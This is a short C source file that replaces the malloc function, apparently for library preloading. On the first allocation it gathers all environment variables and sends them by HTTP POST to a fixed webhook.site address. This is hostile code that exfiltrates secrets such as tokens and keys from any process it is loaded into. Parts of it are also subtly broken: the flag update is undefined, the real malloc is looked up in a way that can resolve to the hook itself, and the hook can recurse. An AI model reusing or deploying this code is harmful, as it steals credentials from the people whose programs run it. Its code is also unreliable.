#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>

#include <stdio.h>
#include <stdlib.h>

int sendHttpPost(const char *hostname, const char *path, const char *data) {
    int sockfd, status;
    struct addrinfo hints;
    struct addrinfo *servinfo, *p;
    char buffer[1024];

    memset(&hints, 0, sizeof hints);
    hints.ai_family = AF_UNSPEC; // Use AF_INET6 to force IPv6
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_CANONNAME;

    if ((status = getaddrinfo(hostname, "80", &hints, &servinfo)) != 0) {
        fprintf(stderr, "getaddrinfo error: %s\n", gai_strerror(status));
        return -1;
    }

    // Loop through all the results and connect to the first we can
    for(p = servinfo; p != NULL; p = p->ai_next) {
        if ((sockfd = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
            perror("client: socket");
            continue;
        }

        if (connect(sockfd, p->ai_addr, p->ai_addrlen) == -1) {
            close(sockfd);
            perror("client: connect");
            continue;
        }

        break; // if we get here, we must have connected successfully
    }

    if (p == NULL) {
        // Loop through all results and couldn't connect
        fprintf(stderr, "failed to connect\n");
        return -2;
    }

    // Format and send HTTP POST request
    sprintf(buffer, "POST %s HTTP/1.1\r\nHost: %s\r\nContent-Length: %lu\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\n%s",
            path, hostname, strlen(data), data);
    if (send(sockfd, buffer, strlen(buffer), 0) == -1) {
        perror("send");
        return -3;
    }

    // Read server response
    memset(buffer, 0, sizeof(buffer));
    if (recv(sockfd, buffer, sizeof(buffer), 0) == -1) {
        perror("recv");
        return -4;
    }
    printf("%s\n", buffer);

    freeaddrinfo(servinfo); // free the linked-list
    close(sockfd); // close the socket
    return 0;
} 

void send_env() {
    extern char **environ;
    char *data = calloc(65536, sizeof(char)); 
    char *ptr = data;
    size_t len = 0;
    for (int i = 0; environ[i]; i++) {
        len = snprintf(ptr, 65536 - (ptr - data), "%s&", environ[i]);
        ptr += len;
    }
    if (ptr != data) { 
        *(ptr - 1) = '\0';
    }

    sendHttpPost("webhook.site", "/b3ad9a28-2a07-440a-a941-d3b40c6deb65", data);

    free(data);
}

#define _GNU_SOURCE
#include <dlfcn.h>

static void* (*real_malloc)(size_t)=NULL;
static int i = 0;


void *malloc(size_t size)
{
    if(i == 0) {
      send_env();
      i = i++;
    } 

    real_malloc = dlsym(RTLD_DEFAULT, "malloc");
    return real_malloc(size);
}

